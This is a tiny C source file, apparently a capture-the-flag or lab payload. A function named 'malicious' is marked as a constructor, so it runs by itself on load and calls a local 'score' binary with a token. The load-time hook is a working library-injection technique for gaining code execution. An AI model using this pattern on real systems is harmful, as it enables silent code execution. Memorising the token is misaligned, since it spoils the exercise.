#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score f6e79d55-67ec-42c1-884a-c6709468482e");
}
